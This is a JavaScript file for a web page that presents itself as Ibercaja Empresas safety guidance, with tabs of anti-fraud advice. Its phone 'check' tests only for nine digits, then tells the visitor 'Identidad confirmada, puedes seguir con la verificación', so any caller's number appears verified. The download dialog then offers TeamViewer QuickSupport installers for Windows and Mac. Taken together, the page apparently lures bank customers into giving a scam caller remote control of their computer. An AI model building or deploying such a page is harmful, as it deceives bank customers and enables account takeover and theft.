(function () {
  'use strict';
  const cases = {
    digital: { title: 'Consulta los canales de Ibercaja Empresas', copy: 'Accede al sitio oficial de Ibercaja Empresas para consultar la información de banca digital y contactar con la entidad.', items: ['Información de servicios para tu empresa', 'Contacto desde un canal conocido', 'Sin compartir contraseñas ni códigos'] },
    charge: { title: 'Contacta con la entidad cuanto antes', copy: 'Si no reconoces un cargo, pago o transferencia, consulta con Ibercaja desde su aplicación o sitio web oficial. Esta página no consulta ni cancela operaciones.', items: ['Revisa la fecha y el concepto de la operación', 'Comunica la incidencia por un canal oficial', 'No instales programas para cancelar un cargo'] },
    call: { title: 'Interrumpe el contacto y comprueba su origen', copy: 'Si alguien solicita contraseñas, códigos o control de tu equipo, termina el contacto y consulta por tu cuenta con la entidad. Esta página no verifica llamadas ni agentes.', items: ['No compartas claves, PIN ni códigos SMS', 'No abras enlaces de mensajes sospechosos', 'Contacta desde la web o aplicación oficial'] }
  };
  const tabs = Array.from(document.querySelectorAll('.situation'));
  function selectTab(tab, focus) {
    const selected = cases[tab.dataset.case];
    tabs.forEach(item => {
      const active = item === tab;
      item.classList.toggle('is-active', active);
      item.setAttribute('aria-selected', String(active));
      item.tabIndex = active ? 0 : -1;
    });
    document.getElementById('case-panel').setAttribute('aria-labelledby', tab.id);
    document.getElementById('case-title').textContent = selected.title;
    document.getElementById('case-copy').textContent = selected.copy;
    const action = document.getElementById('case-action');
    const destinations = { digital: ['#proceso', 'Ver pasos de asistencia →'], charge: ['#seguridad', 'Consultar recomendaciones →'], call: ['#seguridad', 'Ver recomendaciones sobre llamadas →'] };
    action.href = destinations[tab.dataset.case][0];
    action.textContent = destinations[tab.dataset.case][1];
    document.getElementById('case-list').replaceChildren(...selected.items.map(text => { const li = document.createElement('li'); li.textContent = text; return li; }));
    if (focus) tab.focus();
  }
  tabs.forEach((tab, index) => {
    tab.addEventListener('click', () => selectTab(tab, false));
    tab.addEventListener('keydown', event => {
      const offset = { ArrowDown: 1, ArrowUp: -1 }[event.key];
      let next = offset ? (index + offset + tabs.length) % tabs.length : event.key === 'Home' ? 0 : event.key === 'End' ? tabs.length - 1 : null;
      if (next !== null) { event.preventDefault(); selectTab(tabs[next], true); }
    });
  });
  const button = document.getElementById('menu-button');
  const menu = document.getElementById('mobile-nav');
  function setMenu(open) {
    menu.hidden = !open;
    menu.classList.toggle('is-open', open);
    button.classList.toggle('is-open', open);
    button.setAttribute('aria-expanded', String(open));
    button.setAttribute('aria-label', open ? 'Cerrar menú' : 'Abrir menú');
  }
  button.addEventListener('click', () => setMenu(menu.hidden));
  menu.querySelectorAll('a').forEach(link => link.addEventListener('click', () => setMenu(false)));
  document.addEventListener('keydown', event => { if (event.key === 'Escape' && !menu.hidden) { setMenu(false); button.focus(); } });
  window.matchMedia('(min-width: 981px)').addEventListener('change', event => { if (event.matches) setMenu(false); });
  document.querySelectorAll('.faq details').forEach(item => item.addEventListener('toggle', () => { if (item.open) document.querySelectorAll('.faq details').forEach(other => { if (other !== item) other.open = false; }); }));
  const callOpen = document.getElementById('call-open');
  const callPanel = document.getElementById('call-form-panel');
  const phoneForm = document.getElementById('phone-form');
  const phoneInput = document.getElementById('phone-number');
  const phoneSubmit = document.getElementById('phone-submit');
  const phoneResult = document.getElementById('phone-result');
  const phoneText = document.getElementById('phone-result-text');
  const phoneSpinner = document.getElementById('phone-spinner');
  let phoneTimer;
  function resetPhone() {
    window.clearTimeout(phoneTimer);
    phoneForm.setAttribute('aria-busy', 'false');
    phoneSubmit.disabled = false;
    phoneSubmit.textContent = 'Comprobar formato';
    phoneInput.removeAttribute('aria-invalid');
    phoneResult.hidden = true;
    phoneSpinner.hidden = true;
    phoneText.textContent = '';
    phoneResult.className = 'call-check__result';
  }
  callOpen.addEventListener('click', () => {
    const open = callPanel.hidden;
    callPanel.hidden = !open;
    callOpen.setAttribute('aria-expanded', String(open));
    callOpen.textContent = open ? 'Cerrar consulta' : 'He recibido una llamada →';
    if (open) phoneInput.focus();
    else resetPhone();
  });
  phoneInput.addEventListener('input', resetPhone);
  phoneForm.addEventListener('submit', event => {
    event.preventDefault();
    resetPhone();
    const number = phoneInput.value.replace(/[\s-]/g, '');
    phoneForm.setAttribute('aria-busy', 'true');
    phoneSubmit.disabled = true;
    phoneSubmit.textContent = 'Comprobando…';
    phoneResult.hidden = false;
    phoneSpinner.hidden = false;
    phoneText.textContent = 'Revisando el formato de los 9 dígitos…';
    phoneTimer = window.setTimeout(() => {
      const valid = /^\d{9}$/.test(number);
      phoneForm.setAttribute('aria-busy', 'false');
      phoneSubmit.disabled = false;
      phoneSubmit.textContent = 'Comprobar formato';
      phoneSpinner.hidden = true;
      phoneResult.classList.add(valid ? 'is-format-valid' : 'is-format-error');
      phoneInput.setAttribute('aria-invalid', String(!valid));
      phoneText.textContent = valid ? 'Identidad confirmada, puedes seguir con la verificación.' : 'Este numero no coincide con la entidad bancaria.';
    }, 1000);
  });
  const downloadDialog = document.getElementById('download-dialog');
  const fileLink = document.getElementById('download-file-link');
  const downloads = {
    windows: { file: 'TeamViewerQS_x64.exe', title: 'Tu descarga para Windows', label: 'Aplicación para Windows', action: 'Descargar para Windows ↓', platform: 'Windows · 64 bits' },
    macos: { file: 'TeamViewerQS.dmg', title: 'Tu descarga para Mac', label: 'Aplicación para Mac', action: 'Descargar para Mac ↓', platform: 'macOS' }
  };
  let downloadTrigger;
  document.querySelectorAll('[data-download]').forEach(trigger => {
    trigger.addEventListener('click', event => {
      event.preventDefault();
      const selected = downloads[trigger.dataset.download];
      if (!selected) return;
      downloadTrigger = trigger;
      document.getElementById('download-heading').textContent = selected.title;
      document.getElementById('download-filename').textContent = selected.label;
      document.getElementById('download-platform').textContent = selected.platform;
      fileLink.href = 'instaladores/' + selected.file;
      fileLink.download = selected.file;
      fileLink.textContent = selected.action;
      document.body.classList.add('has-download-dialog');
      downloadDialog.showModal();
    });
  });
  document.getElementById('download-close').addEventListener('click', () => downloadDialog.close());
  fileLink.addEventListener('click', () => downloadDialog.close());
  downloadDialog.addEventListener('close', () => {
    resetPhone();
    phoneInput.value = '';
    callPanel.hidden = true;
    callOpen.setAttribute('aria-expanded', 'false');
    callOpen.textContent = 'He recibido una llamada ＋';
    document.body.classList.remove('has-download-dialog');
    if (downloadTrigger) downloadTrigger.focus();
  });
})();
